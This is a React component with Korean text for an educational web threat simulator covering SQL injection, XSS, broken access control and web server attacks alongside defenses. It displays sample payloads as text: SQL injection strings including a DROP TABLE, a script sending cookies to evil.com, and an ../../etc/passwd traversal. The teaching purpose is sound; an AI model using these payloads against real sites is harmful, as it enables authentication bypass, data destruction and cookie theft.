"use client";

import { useState } from "react";
import { motion, AnimatePresence } from "framer-motion";
import {
  Database,
  Code2,
  Lock,
  Server,
  ChevronDown,
  AlertTriangle,
  Shield,
  ArrowRight,
} from "lucide-react";
import SectionTitle from "@/components/common/SectionTitle";

type TabId = "sql" | "xss" | "access" | "webserver";

interface Tab {
  id: TabId;
  label: string;
  en: string;
  icon: React.ReactNode;
  color: string;
  borderColor: string;
  bgLight: string;
  textColor: string;
}

const TABS: Tab[] = [
  {
    id: "sql",
    label: "SQL 인젝션",
    en: "SQL Injection",
    icon: <Database size={16} />,
    color: "bg-pink-600",
    borderColor: "border-pink-500",
    bgLight: "bg-pink-50 dark:bg-pink-900/20",
    textColor: "text-pink-700 dark:text-pink-300",
  },
  {
    id: "xss",
    label: "XSS",
    en: "Cross-Site Scripting",
    icon: <Code2 size={16} />,
    color: "bg-rose-600",
    borderColor: "border-rose-500",
    bgLight: "bg-rose-50 dark:bg-rose-900/20",
    textColor: "text-rose-700 dark:text-rose-300",
  },
  {
    id: "access",
    label: "접근제어 실패",
    en: "Broken Access Control",
    icon: <Lock size={16} />,
    color: "bg-fuchsia-600",
    borderColor: "border-fuchsia-500",
    bgLight: "bg-fuchsia-50 dark:bg-fuchsia-900/20",
    textColor: "text-fuchsia-700 dark:text-fuchsia-300",
  },
  {
    id: "webserver",
    label: "웹서버 공격",
    en: "Web Server Attack",
    icon: <Server size={16} />,
    color: "bg-purple-600",
    borderColor: "border-purple-500",
    bgLight: "bg-purple-50 dark:bg-purple-900/20",
    textColor: "text-purple-700 dark:text-purple-300",
  },
];

const SQL_SCENARIOS = [
  {
    id: "normal",
    label: "정상 입력",
    input: "alice",
    inputColor: "text-green-700 dark:text-green-300",
    query: `SELECT * FROM users WHERE id='alice'`,
    highlight: null,
    result: "alice 사용자의 데이터만 반환 (정상)",
    resultClass: "text-green-700 dark:text-green-300",
    isAttack: false,
  },
  {
    id: "attack1",
    label: "공격 입력 1",
    input: "' OR '1'='1",
    inputColor: "text-red-700 dark:text-red-300",
    query: `SELECT * FROM users WHERE id='' OR '1'='1'`,
    highlight: "' OR '1'='1'",
    result: "모든 행 반환 → 인증 우회 성공!",
    resultClass: "text-red-700 dark:text-red-300",
    isAttack: true,
  },
  {
    id: "attack2",
    label: "공격 입력 2",
    input: "'; DROP TABLE users; --",
    inputColor: "text-red-700 dark:text-red-300",
    query: `SELECT * FROM users WHERE id=''; DROP TABLE users; --'`,
    highlight: "'; DROP TABLE users; --",
    result: "users 테이블 전체 삭제!",
    resultClass: "text-red-700 dark:text-red-300",
    isAttack: true,
  },
];

const XSS_DEFENSES = [
  { label: "입력값 이스케이프", desc: "< → &lt;, > → &gt; 변환으로 스크립트 실행 차단" },
  { label: "CSP(Content Security Policy)", desc: "허가된 출처의 스크립트만 실행하도록 헤더 설정" },
  { label: "HttpOnly 쿠키", desc: "JavaScript에서 쿠키 접근 차단 → 쿠키 탈취 방어" },
];

const ACCESS_EXAMPLES = [
  { bad: "https://shop.com/order?id=1042 (본인 주문)", good: "서버 측에서 주문 소유자 확인" },
  { bad: "https://site.com/admin (URL 직접 입력)", good: "모든 관리자 기능에 권한 검증" },
  { bad: "/download?file=../../etc/passwd", good: "직접 객체 참조 금지, 간접 매핑 사용" },
];

const WEBSERVER_ATTACKS = [
  {
    title: "버퍼 오버플로우",
    en: "Buffer Overflow",
    desc: "웹 서버 소프트웨어의 메모리 처리 결함을 이용해 임의 코드를 실행",
    color: "bg-purple-100 border-purple-300 text-purple-800 dark:bg-purple-900/20 dark:border-purple-600 dark:text-purple-200",
  },
  {
    title: "알려진 CVE 취약점",
    en: "Known CVE Exploits",
    desc: "패치되지 않은 공개 취약점(CVE)을 이용한 공격. 정기 업데이트 미적용 시 위험",
    color: "bg-fuchsia-100 border-fuchsia-300 text-fuchsia-800 dark:bg-fuchsia-900/20 dark:border-fuchsia-600 dark:text-fuchsia-200",
  },
  {
    title: "설정 오류",
    en: "Misconfiguration",
    desc: "기본 계정 방치, 불필요한 서비스 활성화, 디렉터리 목록 공개 등의 설정 오류 악용",
    color: "bg-violet-100 border-violet-300 text-violet-800 dark:bg-violet-900/20 dark:border-violet-600 dark:text-violet-200",
  },
];

const SQL_DEFENSES = [
  { label: "준비된 구문(Prepared Statement)", desc: "SQL 구조와 데이터를 분리하여 입력값이 쿼리 구조를 변경하지 못하도록 함" },
  { label: "입력값 검증", desc: "특수문자(', --, ;) 필터링, 화이트리스트 방식 검증" },
  { label: "최소 권한 원칙", desc: "DB 계정에 최소한의 권한만 부여, 불필요한 DROP/ALTER 권한 제거" },
];

const ACCESS_DEFENSES = [
  { label: "서버 측 접근제어 강제", desc: "클라이언트 측 숨김·비활성화만으로는 불충분. 서버에서 매번 권한 검증 필요" },
  { label: "최소 권한 원칙", desc: "사용자는 업무에 필요한 최소한의 리소스에만 접근 가능" },
  { label: "직접 객체 참조 금지", desc: "내부 ID를 URL에 노출하지 말고, 간접 매핑 테이블 사용" },
];

const WEBSERVER_DEFENSES = [
  { label: "정기적 패치·업데이트", desc: "알려진 CVE 취약점 해소를 위한 신속한 패치 적용" },
  { label: "불필요한 서비스 비활성화", desc: "공격 표면 최소화 — 사용하지 않는 모듈·포트 제거" },
  { label: "WAF(Web Application Firewall)", desc: "웹 애플리케이션 방화벽으로 알려진 공격 패턴 차단" },
];

function SqlInjectionTab() {
  const [selected, setSelected] = useState(SQL_SCENARIOS[0].id);
  const [openDefense, setOpenDefense] = useState<number | null>(null);
  const scenario = SQL_SCENARIOS.find((s) => s.id === selected)!;

  function highlightQuery(query: string, highlight: string | null) {
    if (!highlight) return <span className="text-green-700 dark:text-green-300">{query}</span>;
    const idx = query.indexOf(highlight);
    if (idx === -1) return <span>{query}</span>;
    return (
      <>
        <span className="text-gray-700 dark:text-gray-300">{query.slice(0, idx)}</span>
        <span className="rounded bg-red-200 px-0.5 font-bold text-red-800 dark:bg-red-800/40 dark:text-red-300">
          {highlight}
        </span>
        <span className="text-gray-700 dark:text-gray-300">{query.slice(idx + highlight.length)}</span>
      </>
    );
  }

  return (
    <div>
      <p className="mb-4 text-sm text-gray-600 dark:text-gray-400">
        웹 폼이나 URL 매개변수를 통해 <strong>악의적인 SQL 쿼리를 삽입</strong>하여 DB를 조작하는 공격.
        아래에서 입력값을 선택하면 실행되는 쿼리가 어떻게 변하는지 확인할 수 있습니다.
      </p>

      {/* Input selector */}
      <div className="mb-4">
        <div className="mb-2 text-xs font-semibold text-gray-500 uppercase">입력값 선택</div>
        <div className="flex flex-wrap gap-2">
          {SQL_SCENARIOS.map((s) => (
            <button
              key={s.id}
              onClick={() => setSelected(s.id)}
              className={`rounded-full px-3 py-1.5 text-xs font-medium transition-all border ${
                selected === s.id
                  ? s.isAttack
                    ? "bg-red-600 text-white border-red-600"
                    : "bg-green-600 text-white border-green-600"
                  : "bg-white dark:bg-gray-800 border-gray-300 dark:border-gray-600 text-gray-700 dark:text-gray-300 hover:border-pink-400"
              }`}
            >
              {s.label}
            </button>
          ))}
        </div>
      </div>

      {/* Input value display */}
      <div className="mb-3 rounded-lg bg-gray-100 dark:bg-gray-800 px-4 py-3">
        <div className="mb-1 text-xs text-gray-500">입력값</div>
        <code className={`text-sm font-mono font-bold ${scenario.inputColor}`}>
          {scenario.input}
        </code>
      </div>

      {/* Query visualization */}
      <div className="mb-3 rounded-lg border border-gray-200 dark:border-gray-700 bg-gray-50 dark:bg-gray-900 px-4 py-3">
        <div className="mb-1 text-xs text-gray-500">실행되는 SQL 쿼리</div>
        <code className="block text-sm font-mono leading-relaxed">
          {highlightQuery(scenario.query, scenario.highlight)}
        </code>
      </div>

      {/* Result */}
      <div
        className={`flex items-start gap-2 rounded-lg px-4 py-3 ${
          scenario.isAttack
            ? "bg-red-50 border border-red-200 dark:bg-red-900/20 dark:border-red-800"
            : "bg-green-50 border border-green-200 dark:bg-green-900/20 dark:border-green-800"
        }`}
      >
        {scenario.isAttack ? (
          <AlertTriangle size={16} className="mt-0.5 shrink-0 text-red-500" />
        ) : (
          <Shield size={16} className="mt-0.5 shrink-0 text-green-500" />
        )}
        <span className={`text-sm font-medium ${scenario.resultClass}`}>{scenario.result}</span>
      </div>

      {/* Defense */}
      <div className="mt-6">
        <div className="mb-2 text-sm font-bold text-gray-700 dark:text-gray-200">대응 방법</div>
        <div className="space-y-2">
          {SQL_DEFENSES.map((d, i) => (
            <div key={i} className="rounded-lg border border-pink-200 dark:border-pink-800 overflow-hidden">
              <button
                className="flex w-full items-center gap-2 px-4 py-2.5 text-left bg-pink-50 dark:bg-pink-900/20"
                onClick={() => setOpenDefense(openDefense === i ? null : i)}
              >
                <Shield size={14} className="shrink-0 text-pink-500" />
                <span className="flex-1 text-sm font-medium text-pink-800 dark:text-pink-200">{d.label}</span>
                <ChevronDown
                  size={13}
                  className={`shrink-0 text-pink-500 transition-transform ${openDefense === i ? "rotate-180" : ""}`}
                />
              </button>
              <AnimatePresence>
                {openDefense === i && (
                  <motion.div
                    initial={{ height: 0, opacity: 0 }}
                    animate={{ height: "auto", opacity: 1 }}
                    exit={{ height: 0, opacity: 0 }}
                    transition={{ duration: 0.2 }}
                    className="overflow-hidden"
                  >
                    <div className="px-4 pb-3 pt-2 text-sm text-gray-600 dark:text-gray-400">{d.desc}</div>
                  </motion.div>
                )}
              </AnimatePresence>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}

function XssTab() {
  const [xssType, setXssType] = useState<"stored" | "reflected">("stored");
  const [openDefense, setOpenDefense] = useState<number | null>(null);

  return (
    <div>
      <p className="mb-4 text-sm text-gray-600 dark:text-gray-400">
        웹 페이지에 <strong>악성 스크립트를 삽입</strong>하여 피해자 브라우저에서 실행시키는 공격.
        저장형과 반사형 두 유형으로 나뉩니다.
      </p>

      <div className="mb-4 flex gap-2">
        {(["stored", "reflected"] as const).map((t) => (
          <button
            key={t}
            onClick={() => setXssType(t)}
            className={`rounded-full px-3 py-1.5 text-xs font-medium transition-all border ${
              xssType === t
                ? "bg-rose-600 text-white border-rose-600"
                : "bg-white dark:bg-gray-800 border-gray-300 dark:border-gray-600 text-gray-700 dark:text-gray-300"
            }`}
          >
            {t === "stored" ? "저장형 XSS" : "반사형 XSS"}
          </button>
        ))}
      </div>

      <AnimatePresence mode="wait">
        {xssType === "stored" ? (
          <motion.div
            key="stored"
            initial={{ opacity: 0, y: -5 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -5 }}
            transition={{ duration: 0.2 }}
          >
            <div className="mb-3 rounded-xl border border-rose-200 dark:border-rose-800 bg-rose-50 dark:bg-rose-900/20 p-4">
              <div className="mb-2 text-sm font-bold text-rose-700 dark:text-rose-300">저장형 XSS (Stored XSS)</div>
              <p className="mb-3 text-sm text-gray-700 dark:text-gray-300">
                공격 스크립트가 <strong>DB에 저장</strong>되어, 다른 사용자가 해당 페이지를 조회할 때마다 실행됨.
                파급력이 크고 다수 피해자를 대상으로 함.
              </p>
              {/* Flow */}
              <div className="flex flex-col gap-2 sm:flex-row sm:items-center sm:gap-1 sm:flex-wrap">
                {[
                  { label: "공격자", sub: "악성 스크립트 게시판 입력", bg: "bg-red-100 dark:bg-red-900/30 border-red-300 dark:border-red-700 text-red-800 dark:text-red-200" },
                  { label: "서버/DB", sub: "스크립트 그대로 저장", bg: "bg-gray-100 dark:bg-gray-800 border-gray-300 dark:border-gray-600 text-gray-800 dark:text-gray-200" },
                  { label: "피해자", sub: "게시판 조회 시 스크립트 실행", bg: "bg-orange-100 dark:bg-orange-900/30 border-orange-300 dark:border-orange-700 text-orange-800 dark:text-orange-200" },
                  { label: "공격자", sub: "쿠키/세션 탈취 완료", bg: "bg-red-100 dark:bg-red-900/30 border-red-300 dark:border-red-700 text-red-800 dark:text-red-200" },
                ].map((step, i, arr) => (
                  <div key={i} className="flex items-center gap-1">
                    <div className={`rounded-lg border px-3 py-2 text-xs font-medium ${step.bg}`}>
                      <div className="font-bold">{step.label}</div>
                      <div className="opacity-80">{step.sub}</div>
                    </div>
                    {i < arr.length - 1 && <ArrowRight size={14} className="shrink-0 text-gray-400" />}
                  </div>
                ))}
              </div>
              <div className="mt-3 rounded bg-gray-900 dark:bg-gray-950 px-3 py-2">
                <code className="text-xs text-green-400">
                  {`<script>fetch('https://evil.com?c='+document.cookie)</script>`}
                </code>
              </div>
            </div>
          </motion.div>
        ) : (
          <motion.div
            key="reflected"
            initial={{ opacity: 0, y: -5 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -5 }}
            transition={{ duration: 0.2 }}
          >
            <div className="mb-3 rounded-xl border border-orange-200 dark:border-orange-800 bg-orange-50 dark:bg-orange-900/20 p-4">
              <div className="mb-2 text-sm font-bold text-orange-700 dark:text-orange-300">반사형 XSS (Reflected XSS)</div>
              <p className="mb-3 text-sm text-gray-700 dark:text-gray-300">
                요청 URL에 스크립트를 삽입하면 <strong>서버가 그대로 응답에 반영</strong>. 피해자가 공격 URL을 클릭할 때 즉시 실행됨.
              </p>
              {/* Flow */}
              <div className="flex flex-col gap-2 sm:flex-row sm:items-center sm:gap-1 sm:flex-wrap">
                {[
                  { label: "공격자", sub: "악성 URL 생성·전송", bg: "bg-red-100 dark:bg-red-900/30 border-red-300 dark:border-red-700 text-red-800 dark:text-red-200" },
                  { label: "피해자", sub: "URL 클릭", bg: "bg-orange-100 dark:bg-orange-900/30 border-orange-300 dark:border-orange-700 text-orange-800 dark:text-orange-200" },
                  { label: "서버", sub: "스크립트 그대로 응답에 포함", bg: "bg-gray-100 dark:bg-gray-800 border-gray-300 dark:border-gray-600 text-gray-800 dark:text-gray-200" },
                  { label: "브라우저", sub: "스크립트 실행", bg: "bg-red-100 dark:bg-red-900/30 border-red-300 dark:border-red-700 text-red-800 dark:text-red-200" },
                ].map((step, i, arr) => (
                  <div key={i} className="flex items-center gap-1">
                    <div className={`rounded-lg border px-3 py-2 text-xs font-medium ${step.bg}`}>
                      <div className="font-bold">{step.label}</div>
                      <div className="opacity-80">{step.sub}</div>
                    </div>
                    {i < arr.length - 1 && <ArrowRight size={14} className="shrink-0 text-gray-400" />}
                  </div>
                ))}
              </div>
              <div className="mt-3 rounded bg-gray-900 dark:bg-gray-950 px-3 py-2">
                <code className="text-xs text-yellow-400 break-all">
                  https://site.com/search?q=&lt;script&gt;악성코드&lt;/script&gt;
                </code>
              </div>
            </div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Defense */}
      <div className="mt-4">
        <div className="mb-2 text-sm font-bold text-gray-700 dark:text-gray-200">대응 방법</div>
        <div className="space-y-2">
          {XSS_DEFENSES.map((d, i) => (
            <div key={i} className="rounded-lg border border-rose-200 dark:border-rose-800 overflow-hidden">
              <button
                className="flex w-full items-center gap-2 px-4 py-2.5 text-left bg-rose-50 dark:bg-rose-900/20"
                onClick={() => setOpenDefense(openDefense === i ? null : i)}
              >
                <Shield size={14} className="shrink-0 text-rose-500" />
                <span className="flex-1 text-sm font-medium text-rose-800 dark:text-rose-200">{d.label}</span>
                <ChevronDown
                  size={13}
                  className={`shrink-0 text-rose-500 transition-transform ${openDefense === i ? "rotate-180" : ""}`}
                />
              </button>
              <AnimatePresence>
                {openDefense === i && (
                  <motion.div
                    initial={{ height: 0, opacity: 0 }}
                    animate={{ height: "auto", opacity: 1 }}
                    exit={{ height: 0, opacity: 0 }}
                    transition={{ duration: 0.2 }}
                    className="overflow-hidden"
                  >
                    <div className="px-4 pb-3 pt-2 text-sm text-gray-600 dark:text-gray-400">{d.desc}</div>
                  </motion.div>
                )}
              </AnimatePresence>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}

function AccessControlTab() {
  const [openDefense, setOpenDefense] = useState<number | null>(null);

  return (
    <div>
      <p className="mb-4 text-sm text-gray-600 dark:text-gray-400">
        <strong>인증(Authentication)</strong>은 됐지만 <strong>인가(Authorization)</strong> 검사가 부적절한 경우.
        사용자가 자신의 권한을 초과한 리소스에 접근하는 취약점입니다.
      </p>

      <div className="mb-4 space-y-3">
        {ACCESS_EXAMPLES.map((ex, i) => (
          <div key={i} className="rounded-xl border border-fuchsia-200 dark:border-fuchsia-800 overflow-hidden">
            <div className="grid grid-cols-1 sm:grid-cols-2">
              <div className="bg-red-50 dark:bg-red-900/20 p-3">
                <div className="mb-1 text-xs font-bold text-red-600 dark:text-red-400">취약 (클라이언트 측만 검증)</div>
                <code className="text-xs text-red-800 dark:text-red-200 break-all">{ex.bad}</code>
              </div>
              <div className="bg-green-50 dark:bg-green-900/20 p-3 border-t sm:border-t-0 sm:border-l border-fuchsia-200 dark:border-fuchsia-800">
                <div className="mb-1 text-xs font-bold text-green-600 dark:text-green-400">안전 (서버 측 검증)</div>
                <span className="text-xs text-green-800 dark:text-green-200">{ex.good}</span>
              </div>
            </div>
          </div>
        ))}
      </div>

      <div className="mt-4">
        <div className="mb-2 text-sm font-bold text-gray-700 dark:text-gray-200">대응 방법</div>
        <div className="space-y-2">
          {ACCESS_DEFENSES.map((d, i) => (
            <div key={i} className="rounded-lg border border-fuchsia-200 dark:border-fuchsia-800 overflow-hidden">
              <button
                className="flex w-full items-center gap-2 px-4 py-2.5 text-left bg-fuchsia-50 dark:bg-fuchsia-900/20"
                onClick={() => setOpenDefense(openDefense === i ? null : i)}
              >
                <Shield size={14} className="shrink-0 text-fuchsia-500" />
                <span className="flex-1 text-sm font-medium text-fuchsia-800 dark:text-fuchsia-200">{d.label}</span>
                <ChevronDown
                  size={13}
                  className={`shrink-0 text-fuchsia-500 transition-transform ${openDefense === i ? "rotate-180" : ""}`}
                />
              </button>
              <AnimatePresence>
                {openDefense === i && (
                  <motion.div
                    initial={{ height: 0, opacity: 0 }}
                    animate={{ height: "auto", opacity: 1 }}
                    exit={{ height: 0, opacity: 0 }}
                    transition={{ duration: 0.2 }}
                    className="overflow-hidden"
                  >
                    <div className="px-4 pb-3 pt-2 text-sm text-gray-600 dark:text-gray-400">{d.desc}</div>
                  </motion.div>
                )}
              </AnimatePresence>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}

function WebServerTab() {
  const [openDefense, setOpenDefense] = useState<number | null>(null);

  return (
    <div>
      <p className="mb-4 text-sm text-gray-600 dark:text-gray-400">
        웹 서버 소프트웨어 자체의 <strong>취약점</strong>을 악용하는 공격. 서버 장악 시 전체 시스템이 위험에 노출됩니다.
      </p>

      <div className="mb-4 grid gap-3 sm:grid-cols-3">
        {WEBSERVER_ATTACKS.map((a, i) => (
          <div key={i} className={`rounded-xl border p-4 ${a.color}`}>
            <div className="mb-1 text-xs font-bold">{a.en}</div>
            <div className="mb-2 text-sm font-bold">{a.title}</div>
            <p className="text-xs leading-relaxed opacity-90">{a.desc}</p>
          </div>
        ))}
      </div>

      <div className="mt-4">
        <div className="mb-2 text-sm font-bold text-gray-700 dark:text-gray-200">대응 방법</div>
        <div className="space-y-2">
          {WEBSERVER_DEFENSES.map((d, i) => (
            <div key={i} className="rounded-lg border border-purple-200 dark:border-purple-800 overflow-hidden">
              <button
                className="flex w-full items-center gap-2 px-4 py-2.5 text-left bg-purple-50 dark:bg-purple-900/20"
                onClick={() => setOpenDefense(openDefense === i ? null : i)}
              >
                <Shield size={14} className="shrink-0 text-purple-500" />
                <span className="flex-1 text-sm font-medium text-purple-800 dark:text-purple-200">{d.label}</span>
                <ChevronDown
                  size={13}
                  className={`shrink-0 text-purple-500 transition-transform ${openDefense === i ? "rotate-180" : ""}`}
                />
              </button>
              <AnimatePresence>
                {openDefense === i && (
                  <motion.div
                    initial={{ height: 0, opacity: 0 }}
                    animate={{ height: "auto", opacity: 1 }}
                    exit={{ height: 0, opacity: 0 }}
                    transition={{ duration: 0.2 }}
                    className="overflow-hidden"
                  >
                    <div className="px-4 pb-3 pt-2 text-sm text-gray-600 dark:text-gray-400">{d.desc}</div>
                  </motion.div>
                )}
              </AnimatePresence>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}

export default function WebThreatSimulator() {
  const [activeTab, setActiveTab] = useState<TabId>("sql");
  const tab = TABS.find((t) => t.id === activeTab)!;

  return (
    <section>
      <SectionTitle
        title="웹 위협 4종 시뮬레이터"
        subtitle="SQL 인젝션 · XSS · 접근제어 실패 · 웹서버 공격 — 공격 원리와 대응 방법"
      />

      {/* Tab buttons */}
      <div className="mb-6 flex flex-wrap gap-2">
        {TABS.map((t) => (
          <button
            key={t.id}
            onClick={() => setActiveTab(t.id)}
            className={`flex items-center gap-2 rounded-full px-4 py-2 text-sm font-medium transition-all ${
              activeTab === t.id
                ? `${t.color} text-white shadow-md`
                : "bg-gray-100 dark:bg-gray-800 text-gray-600 dark:text-gray-400 hover:bg-gray-200 dark:hover:bg-gray-700"
            }`}
          >
            {t.icon}
            <span className="hidden sm:inline">{t.label}</span>
            <span className="sm:hidden">{t.label.split(" ")[0]}</span>
          </button>
        ))}
      </div>

      {/* Tab content */}
      <div className={`rounded-2xl border-2 ${tab.borderColor} ${tab.bgLight} p-6`}>
        <div className={`mb-4 flex items-center gap-2 ${tab.textColor}`}>
          {tab.icon}
          <span className="text-base font-bold">{tab.label}</span>
          <span className="text-xs opacity-70">({tab.en})</span>
        </div>

        <AnimatePresence mode="wait">
          <motion.div
            key={activeTab}
            initial={{ opacity: 0, y: -6 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -6 }}
            transition={{ duration: 0.2 }}
          >
            {activeTab === "sql" && <SqlInjectionTab />}
            {activeTab === "xss" && <XssTab />}
            {activeTab === "access" && <AccessControlTab />}
            {activeTab === "webserver" && <WebServerTab />}
          </motion.div>
        </AnimatePresence>
      </div>
    </section>
  );
}
